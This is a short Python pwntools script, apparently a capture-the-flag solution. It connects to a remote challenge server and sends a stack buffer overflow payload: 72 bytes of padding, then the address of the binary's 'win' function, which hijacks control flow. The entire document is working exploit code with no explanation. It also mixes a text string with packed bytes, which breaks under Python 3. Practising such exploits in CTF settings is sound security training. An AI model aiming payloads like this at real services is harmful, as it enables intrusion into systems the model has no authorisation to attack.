from pwn import *

io = remote("challenges.ctfd.io", "30249")
e = ELF("./chall")


payload = "A" * (64 + 8) + p64(e.sym['win'])
io.recvline()
io.sendline(payload)
print(io.recvall())